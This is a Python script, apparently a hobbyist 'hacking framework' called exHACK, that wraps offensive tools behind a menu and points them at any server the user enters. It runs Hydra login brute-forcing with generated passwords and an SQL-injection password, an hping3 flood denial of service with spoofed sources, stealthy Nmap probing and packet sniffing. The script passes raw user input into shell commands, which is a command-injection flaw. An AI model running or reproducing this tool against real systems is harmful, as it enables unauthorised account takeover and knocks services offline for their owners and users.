import time, sys, os, random
print('Welcome to exHACK, the Hacking Lazyscript Framework. Made by IRISnoir.')
time.sleep(2.5)
print('Designated to both Script Kiddies and Hackers alike.')
time.sleep(2)
print('Checking and installing the nessacary packages...')
time.sleep(2)
os.system('apt install root-repo -y && apt install toilet tsu nmap arp-scan tshark hydra hping3 tracepath crunch')
time.sleep(1)
print('Installation completed.')
time.sleep(0.5)
sys.stdout.write('\rInitializing')
time.sleep(0.2)
sys.stdout.write('\rInitializing.')
time.sleep(0.2)
sys.stdout.write('\rInitializing..')
time.sleep(0.2)
sys.stdout.write('\rInitializing...')
time.sleep(0.2)
os.system('clear')
os.system('toilet -f ascii12 -F border exHACK')
time.sleep(0.5)
while True:
    print('Please select a number from the list')
    sys.stdout.write('\r[0] Ex17 Fr4m3wo2k')
    time.sleep(0.5)
    sys.stdout.write('\r[0] Exit Framework')
    time.sleep(0.5)
    sys.stdout.write('\n\r[1] Ne7w0rk 5cann3r (Nm4p)')
    time.sleep(0.5)
    sys.stdout.write('\r[1] N3tw02k Sc4nn3r (Nmap)                 [2] A2p 2ad4r (Arp-5can 4nd Arp-f1n93rp2int - Ro0t)')
    time.sleep(0.5)
    sys.stdout.write('\r[1] Network Scanner (Nmap)                 [2] Arp Radar (Arp-scan and Arp-fingerprint - Root)')
    time.sleep(0.5)
    sys.stdout.write('\n\r[3] P4ck3t 50nar (T5hark - R0ot)')
    time.sleep(0.5)
    sys.stdout.write('\r[3] P4cke7 Sona2 (Tsh4rk - Ro0t)           [4] Lo91n B2ut3r (Hyd2a)')
    time.sleep(0.5)
    sys.stdout.write('\r[3] Packet Sonar (Tshark - Root)           [4] Login Bruter (Hydra)')
    time.sleep(0.5)
    sys.stdout.write('\n\r[5] H19h 5pe3d D.0.S (Hp1ng3 - R00t)')
    time.sleep(0.5)
    sys.stdout.write('\r[5] Hi9h Sp3ed D.o.5 (Hpin93 - R0ot)       [6] 7rac3rou7er (7rac3path)')
    time.sleep(0.5)
    sys.stdout.write('\r[5] High Speed D.o.S (Hping3 - Root)       [6] Tracerouter (Tracepath)')
    time.sleep(0.5)
    print('\n')
    sys.stdout.write('\rSel3c7 y0ur 4ct10n: ')
    time.sleep(0.5)
    action_select = input('\rSelect your action: ')

    if action_select == str('0'):
        print('Exiting framework, thank you for using exHACK.')
        time.sleep(1.5)
        sys.stdout.write('\rShutting down')
        time.sleep(0.2)
        sys.stdout.write('\rShutting down.')
        time.sleep(0.2)
        sys.stdout.write('\rShutting down..')
        time.sleep(0.2)
        sys.stdout.write('\rShutting down...')
        print('\n')
        exit()

    if action_select == str('1'):
        print('Network Scanner selected.')
        time.sleep(0.5)
        print('Nmap activated.')
        time.sleep(0.5)
        while True:
            server = input('*Specify the server which you want scanned: ')
            if server == '':
                print('You have to enter the server in order to scan.')
            else:
                print('')
                break

        save_conf = input('Do you wish to save your scan results into a file? [y/n](Default:n): ')
        if save_conf in 'y':
            success_file = input('Specify the name of the file that will have your scan results written in (Leave blank if you change your mind): ')
            if success_file == '':
                print('You changed your mind, the results will not be written to a file.')
                time.sleep(4)
            else:
                success_file = '-oN ' + success_file + ' '
        else:
            print('Scan results will not be written to a file.')
            success_file = ''
            
        print('')
        print('Method:')
        time.sleep(0.1)
        print('[1] - Casual port scan (Quick, only shows ports and their status)')
        time.sleep(0.1)
        print('[2] - Advanced probe (Not too long, shows ports and their probed contents)')
        time.sleep(0.1)
        print('[3] - Fatal probe (Long time, shows ports and their heavily probed contents)')
        time.sleep(0.1)

        while True:
            method = input('Select scan method: ')
            
            if method == str('1'):
                os.system('nmap -Pn ' + success_file + server)
                break

            if method == str('2'):
                os.system('nmap -Pn -A ' + success_file + server)
                break

            if method == str('3'):
                os.system('nmap -vv -dd -PE -PP -PM -Pn -R --system-dns --scanflags URGACKPSHRSTSYNFIN -p1-65535 -sV --version-all --version-trace --script all --script-trace --min-rate 0.1 -D RND:5 --data-length 1400 --badsum --reason --packet-trace -A ' + success_file + server)
                break

    if action_select == str('2'):
        print('Arp Radar selected.')
        time.sleep(0.5)
        print('Arp-Scan and Arp-Fingerprint activated.')
        time.sleep(0.5)
        root_verify = input('Root is required for this tool to work. Have you rooted your device? [y/n](Default:n): ')
        print('')
        if root_verify == 'y':
            print('Initiating Arp-Scan')
            os.system('tsudo arp-scan -l -v -R -D -L')
            print('')
            time.sleep(0.5)
            print('Initiating Arp-Fingerprint')
            os.system('tsudo arp-fingerprint -v -l')
            break
        else:
            print('Root your device first then come back.')
            break

    if action_select == str('3'):
        print('Packet Sonar selected.')
        time.sleep(0.5)
        print('Tshark activated.')
        time.sleep(0.5)
        root_verify = input('Root is required for this tool to work. Have you rooted your device? [y/n](Default:n): ')
        print('')
        if root_verify == 'y':
            print('[1] Perform a live capture')
            time.sleep(0.5)
            print('[2] Read a capture file')
            time.sleep(0.5)
            while True:
                sniffread = input('What would you like to do: ')
                if sniffread in ['1','2']:
                    if sniffread == '1':
                        capfile = ''
                        save = input('Would you like to save your sniff into a file? [y/n](Default:n): ')
                        if save == 'y':
                            capfile = input('Specify the name of the file that will have your sniff results written into (Leave blank if you change your mind): ')
                            if capfile == '':
                                print('You changed your mind, results won\'t be written into a file.')
                            else:
                                capfile = '-w ' + capfile
                        else:
                            print('Acknowledged, results won\'t be written to a file')
                    if sniffread == '2':
                        while True:
                            capfile = input('Input file: ')
                            try:
                                open(capfile,'r')
                            except FileNotFoundError:
                                print('The specified filename doesn\'t exist. Try again.')
                            else:
                                capfile = '-r ' + capfile
                                break
                    break
                else:
                    print('Please input \'1\' or \'2\'')
            verbose = input('Would you like to make the output more verbose? [y/n](Default:n): ')
            time.sleep(0.5)
            if verbose == 'y':
                print('Customize by inputting the small numbers into a big one (for example: 13):')
                time.sleep(0.5)
                print('[1] Show packet details')
                time.sleep(0.5)
                print('[2] Dump hex and ASCII')
                time.sleep(0.5)
                print('[3] Enable extra information')
                time.sleep(0.5)
                vercus = input('Input customizable verbosity: ')
                vercom = ''
                if str(1) in str(vercus):
                    vercom += '-V '
                if str(2) in str(vercus):
                    vercom += '-x '
                if str(3) in str(vercus):
                    vercom += '-W n '
            else:
                vercom = ''    
            os.system('tsudo tshark -P ' + vercom + '--color -d tcp.port==1:65535,http -F pcapng ' + capfile)
        else:
            print('Root your device first then come back.')

    if action_select == str('4'):
        print('Login Bruter selected.')
        time.sleep(0.5)
        print('Hydra activated.')
        time.sleep(0.5)
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        numbers = '0123456789'

        while True:
            server = input('*Specify the server which you want bruteforced: ')
            if server == '':
                print('Please enter a server to commence bruteforce.')
            else:
                print('')
                break

        while True:
            login = input('*Specify the login or a file containing a list of logins which you want to bruteforce: ')
            if login != '':
                try:
                    open(login)
                except FileNotFoundError:
                    print('Data specified is not a filename.')
                    time.sleep(3)
                    login_spec = '-l'
                    break
                else:
                    print('Data specified is a filename.')
                    time.sleep(3)
                    login_spec = '-L'
                    break
            else:
                print('You must enter the login name or file to continue.')

        print('''
Supported protocols: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
''')
        while True:
            protocol = input('*Specify the protocol type: ')
            if protocol == '':
                print('You must specify a protocol.')
            else:
                print('Protocol given.')
                print('')
                break

        while True:
            port = input('Select the port, leave blank and hydra will select default: ')
            if port == '':
                print('Port number not given. Hydra will select default.')
                print('')
                time.sleep(3)
                break
            else:
                try:
                    int(port) / 1
                except ValueError:
                    print('The port must be an integer.')
                else:
                    print('Port given.')
                    print('')
                    port = '-s ' + str(port) + ' '
                    time.sleep(1)
                    break

        extra = input('Input the extra statement (include double brackets, example: "Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"): ')
        if extra == '':
            print('No supplied statement.')
        else:
            print('Statement supplied.')
            extra = '/' + extra

        print('')
        time.sleep(1)
        save_conf = input('Do you wish to save cracked password pairs into a file? [y/n](Default: n): ')
        if save_conf in ['y' , 'yes']:
            success_file = input('Specify the name of the file that will have your success written in (Leave blank if you change your mind): ')
            if success_file == '':
                print('You changed your mind, successful cracks will not be written to a file.')
                time.sleep(4)
            else:
                success_file = '-o ' + success_file + ' '
        else:
            print('Successful cracks will not be written to a file.')
            success_file = ''

        print('')

        while True:
            print('Method:')
            time.sleep(0.1)
            print('[1] - Random characters - Random customizable length (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[2] - Integer bruteforce - Non-random (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[3] - Integer bruteforce - Random (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[4] - Specify file')
            time.sleep(0.1)
            print('[5] - SQL injection test')
            time.sleep(0.1)
            print('[6] - True brute')
            method = input('*Select your bruteforcing method: ')
            if method == '1':
                while True:
                    method_1_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
                    if method_1_min_len == '':
                        print('The minimum length is set to \'1\'.')
                        method_1_min_len = 1
                        break
                    else:
                        try:
                            int(method_1_min_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The minimum length is set to \'' + method_1_min_len + '\'.')
                            break
                while True:
                    method_1_max_len = input('*Input maximum length: ')
                    if method_1_max_len == '':
                        print('You must supply a maximum length.')
                    else:
                        try:
                            int(method_1_max_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The maximum length is set to \'' + method_1_max_len + '\'')
                            break
                while True:
                    password = ''.join(random.SystemRandom().choice(alphabet) for c in range(random.randint(int(method_1_min_len),int(method_1_max_len))))
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + password + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
            if method == '2':
                password = 0
                while True:
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                    password += 1
            if method == '3':
                while True:
                    method_3_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
                    if method_3_min_len == '':
                        print('The minimum length is set to \'1\'.')
                        method_3_min_len = 1
                        break
                    else:
                        try:
                            int(method_3_min_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The minimum length is set to \'' + method_3_min_len + '\'')
                            break
                while True:
                    method_3_max_len = input('*Input maximum length: ')
                    if method_3_max_len == '':
                        print('You must supply a maximum length.')
                    else:
                        try:
                            int(method_3_max_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The maximum length is set to \'' + '\'')
                            break
                while True:
                    password = ''.join(random.SystemRandom().choice(numbers) for c in range(random.randint(int(method_3_min_len),int(method_3_max_len))))
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
            if method == '4':
                while True:
                    password = input('*Specify your wordlist: ')
                    if password == '':
                        print('You have to input a wordlist.')
                    else:
                        try:
                            open(password)
                        except FileNotFoundError:
                            print('The file you specified doesn\'t exist.')
                        else:
                            break
                os.system('hydra ' + login_spec + ' ' + login + ' -P ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                break
            if method == '5':
                os.system('hydra ' + login_spec + ' ' + login + ' -p "\' or 1=1--"' + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                break
            if method == '6':
                while True:
                    method_6_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
                    if method_6_min_len == '':
                        print('The minimum length is set to \'1\'.')
                        method_6_min_len = 1
                        break
                    else:
                        try:
                            int(method_6_min_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The minimum length is set to \'' + method_6_min_len + '\'')
                            break
                while True:
                    method_6_max_len = input('*Input maximum length: ')
                    if method_6_max_len == '':
                        print('You must supply a maximum length.')
                    else:
                        try:
                            int(method_6_max_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The maximum length is set to \'' + '\'')
                            break
                print('Please wait for the generator')
                time.sleep(2)
                password = os.popen("crunch " + str(method_6_min_len) + " " + str(method_6_max_len) + " 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'").read().split('\n')
                number = 0
                try:
                    while True:
                        os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password[number]) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                        number += 1
                except IndexError:
                    break
            else:
                print('Please select a number from the list.')

    if action_select == str('5'):
        server = input('Input the server which you want to D.o.S: ')

        print('Modes:')
        time.sleep(0.1)
        print('1. TCP')
        time.sleep(0.1)
        print('2. Raw IP')
        time.sleep(0.1)
        print('3. ICMP')
        time.sleep(0.1)
        print('4. UDP')
        time.sleep(0.1)
        mode = input('Choose your mode (You can only choose one, default: TCP): ')
        if mode == str('1'):
            print('Mode: TCP')
            mode = ' '
        elif mode == str('2'):
            print('Mode: Raw IP')
            mode = ' -0 '
        elif mode == str('3'):
            print('Mode: ICMP')
            mode = ' -1 '
        elif mode == str('4'):
            print('Mode: UDP')
            mode = ' -2 '
        else:
            print('Mode: TCP')
            mode = ' '
        print('')
            
        os.system('tsudo hping3 --flood --beep -V --rand-source -t 65535 -m 65535 -f --force-icmp -b -FSRPAUXY -d -T' + mode + server)

    if action_select == str('6'):
        server = input('Please input the server which you want tracerouted: ')
        os.system('tracepath -b -l 1400 -m 200 ' + server)
